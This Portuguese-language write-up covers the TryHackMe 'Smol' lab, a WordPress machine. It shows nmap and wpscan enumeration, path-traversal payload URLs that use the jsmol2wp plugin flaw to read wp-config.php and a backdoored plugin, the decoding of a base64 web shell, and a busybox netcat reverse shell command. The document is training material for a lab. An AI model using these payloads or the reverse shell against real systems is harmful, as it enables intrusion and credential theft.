# Room - SMOL - TryHackMe 
Autor: carlossb1\
Nível: Médio\
Tópico: Web / Linux


## Introdução

Informações do autor da máquina:

At the heart of Smol is a WordPress website, a common target due to its extensive plugin ecosystem. The machine showcases a publicly known vulnerable plugin, highlighting the risks of neglecting software updates and security patches. Enhancing the learning experience, Smol introduces a backdoored plugin, emphasizing the significance of meticulous code inspection before integrating third-party components.

Quick Tips: Do you know that on computers without GPU like the AttackBox, John The Ripper is faster than Hashcat?

Informações chave:
- O alvo é um site wordpress;
- Existem plugins vulneráveis, inclusive um com um backdoor já instalado;
- Pela dica do john vs hashcat, já sabemos que a máquina vai envolver quebrar hashes.

## Enumeração

Vamos rodar o nmap nessa fera :\

`nmap -sC -sV <ip> -o scan`

![250603_11h43m43s_screenshot](https://github.com/user-attachments/assets/abedcead-ae60-45e0-a3d8-6e50f6ed5f13)

Podemos ver que a requisição http foi redirecionada para o endereço http://www.smol.thm, então vamos adicionar esse endereço na nossa lista de hosts
(o ip da máquina foi alterado algumas vezes durante as screenshots pois eu precisei resolver ela aos poucos, tendo que respawnar entre as tentativas)

`sudo vi /etc/hosts`

![250603_11h48m31s_screenshot](https://github.com/user-attachments/assets/7eadad59-d0c8-418a-9c3c-8506801c6998)

Após essa etapa, não devemos mais ter problemas com a resolução do dns, e conseguiremos acessar a página web.


![250603_11h57m43s_screenshot](https://github.com/user-attachments/assets/1ffa3acc-b914-4a96-9a10-865e7d8377e2)

A página no primeiro momento não apresenta nada de anormal ou que possamos interagir diretamente.

### WPSCAN

O wpscan é uma ferramenta muito útil para enumeração de sites feitos com base em wordpress.

Não é necessário se cadastrar para utilizar a ferramenta, mas quando você realiza o cadastro, recebe uma chave para utilização da API deles, que te permite utiliza algumas funcionalidades extras. Entre essas, a identificação de vulnerabilidades e o código dos CVEs:

`wpscan --api-token <TOKEN> -url http://www.smol.thm` 

![250603_12h07m23s_screenshot](https://github.com/user-attachments/assets/48f29a3d-fd10-4826-851d-d56180ce0aef)

Identificamos 2 CVEs: 2018-20463 e 2018-20462
## Exploração

### CVE 2018-20462

Pesquisando pelo CVE, encontramos essa prova de conceito:

https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt

Podemos abusar dessa falha para ler arquivos do sistema com o seguinte payload:

`http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php`

Tendo acesso à configuração inicial do banco de dados do wordpress, conseguimos pegar as credenciais de um usuário

![250603_12h28m34s_screenshot](https://github.com/user-attachments/assets/6064b06e-f5d7-4dae-b127-396aab672b01)

Vamos tentar utilizá-la para logar.

![250603_12h29m12s_screenshot](https://github.com/user-attachments/assets/cb540757-2a27-44bb-ab55-403ae509c381)

Temos acesso ao dashboard de administração da página.

![250603_12h29m54s_screenshot](https://github.com/user-attachments/assets/07749b0f-b9a3-4445-8807-1de5907d3172)

Depois de rodar um pouco pelo dashboard, não encontrei muita coisa que pudesse ser feita além de uma parte que permitia realizar upload de imagens. Tentei bypassar o filtro por um tempo pra ver se conseguia fazer o upload de uma shell em php, mas depois de algumas tentativas decidi ver o que mais havia pelo site.

Em uma das páginas, havia um link de tarefas a fazer, em que era mencionado a revisão de um plugin para inspeção de backdoor.

Esse é o segundo plugin mencionado pelo autor do desafio.

![250603_12h39m20s_screenshot](https://github.com/user-attachments/assets/d4984b80-ac1e-4f78-ae0d-55c7151dca9a)

### Hello Dolly

Agora precisamos dar um jeito der ler o código do plugin.

Lembrando que temos LFI graças ao CVE 2018-20462, testei o payload para ler o código fonte do plugin jsmol:

`http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/jsmol2wp/php/jsmol.php`

![250603_12h45m42s_screenshot](https://github.com/user-attachments/assets/21df055d-2dee-4170-b985-1e759f2396c0)


Tentando ler o o código do hello-dolly:

Seguindo a recomendação do próprio WordPress quanto à organização dos plugins:

![250603_13h08m36s_screenshot](https://github.com/user-attachments/assets/4f5342c2-22ea-4e54-915b-6b45cc92fbc9)


E o código do plugin no github:

![250603_13h22m07s_screenshot](https://github.com/user-attachments/assets/4c41aece-6437-4e2a-8340-cdcc73799697)

Tentei utilizar o seguinte payload para ler o código do plugin no server:

`http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello-dolly/hello.php`

Depois de entrar num loophole enorme, encontrei essa thread de discussão dos desenvolvedores, que fala justamente sobre essa característica do plugin:

https://core.trac.wordpress.org/ticket/53323

![250603_13h30m22s_screenshot](https://github.com/user-attachments/assets/aff31b1b-511a-4a3e-b50b-99ecbe3fe8e4)

Resumindo a thread, nas versões antigas, o plugin não ficava dentro de uma pasta própria, indo contra as boas práticas indicadas pelos desenvolvedores. Foi feito um esforço para alterar essa condição nas versões mais novas, mas parece que no nosso alvo a versão ainda não está atualizada.

Então editamos nosso payload para acessar o código do plugin:

`http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php`

![250603_13h34m03s_screenshot](https://github.com/user-attachments/assets/f4670307-9c72-486b-8d59-cafbef9c019a)

Achamos o backdoor dentro do código, um webshell codificado em base64:

![250603_13h35m18s_screenshot](https://github.com/user-attachments/assets/56f9ffc1-0748-4185-9d5e-ecce46e8d9f8)

Depois de decodificar o b64, os caracteres que recebem o comando ainda continuam obfuscados. 

Convertendo os dois caracteres hexadecimais para ascii, obtemos: [ ][x6d][x64] - > [ ][m][d]
Por aqui já dava pra chutar que o parâmetro seria "cmd". O 143 não é conversível de decimal para ASCII, depois de procurar um pouco, vi que convertendo de octal para ASCII, conseguimos identificar o último caractere, que de fato é o "c".

Vamos testar a execução de código:

`http://www.smol.thm/wp-admin.php/about.php?cmd=ls`

![250603_14h09m44s_screenshot](https://github.com/user-attachments/assets/b72ea9a0-1684-4367-8508-57084dedc416)

Conseguimos utilizar o backdoor com sucesso para execução de código remoto.

## Exfiltrando o banco de dados

Agora que temos RCE, vamos pegar uma shell na máquina:
(Eu tenho usado bastante o busybox para invocar o netcat, nessas rooms ele geralmente está se mostrando o mais consistente pra mim.)

no site: `http://www.smol.thm/wp-admin.php/about.php?cmd=busybox nc <ip> <porta> -e sh` 

na máquina: `nc -lvnp <porta>`

![250603_14h15m31s_screenshot](https://github.com/user-attachments/assets/d09a8e46-e28f-4070-bb29-c853e76ea494)






